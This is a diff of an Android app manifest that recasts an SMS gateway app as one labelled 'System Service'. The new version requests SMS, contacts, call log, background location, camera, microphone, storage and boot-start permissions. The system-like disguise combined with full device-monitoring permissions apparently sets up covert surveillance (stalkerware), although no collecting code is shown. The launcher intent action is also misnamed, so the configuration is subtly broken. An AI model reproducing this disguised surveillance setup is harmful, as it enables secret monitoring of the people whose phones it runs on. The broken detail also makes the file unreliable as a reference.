@@ -1,35 +1,45 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-  package="com.smsgateway">
+    package="com.smsgateway.example">
 
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
 
-  <uses-permission android:name="android.permission.INTERNET" />
-  <uses-permission android:name="android.permission.READ_SMS" />
-  <uses-permission android:name="android.permission.RECEIVE_SMS" />
-  <uses-permission android:name="android.permission.WAKE_LOCK" />
-  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
-  <application>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- SMS Receiver: required for receiving SMS in background -->
-    <receiver 
-      android:name=".SmsGatewayReceiver"
-      android:enabled="true" 
-      android:exported="true"
-      android:permission="android.permission.BROADCAST_SMS">
-      <intent-filter android:priority="999">
-        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-      </intent-filter>
-    </receiver>
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
-    <!-- Boot Receiver: required for listening after device reboot -->
-    <receiver 
-      android:name=".SmsGatewayBootReceiver" 
-      android:enabled="true"
-      android:exported="false">
-      <intent-filter>
-        <action android:name="android.intent.action.BOOT_COMPLETED" />
-      </intent-filter>
-    </receiver>
-
-  </application>
+    <application
+      android:name=".MainApplication"
+      android:label="System Service"
+      android:icon="@mipmap/ic_launcher"
+      android:roundIcon="@mipmap/ic_launcher_round"
+      android:allowBackup="false"
+      android:theme="@style/AppTheme">
+      
+      <activity
+        android:name=".MainActivity"
+        android:label="System Service"
+        android:configChanges="keyboard|keyboardHidden|orientation|screenSize|uiMode"
+        android:launchMode="singleTask"
+        android:windowSoftInputMode="adjustResize"
+        android:exported="true">
+        
+        <intent-filter>
+            <action android:name="android.intent.activity.MAIN" />
+            </intent-filter>
+      </activity>
+    </application>
 </manifest>
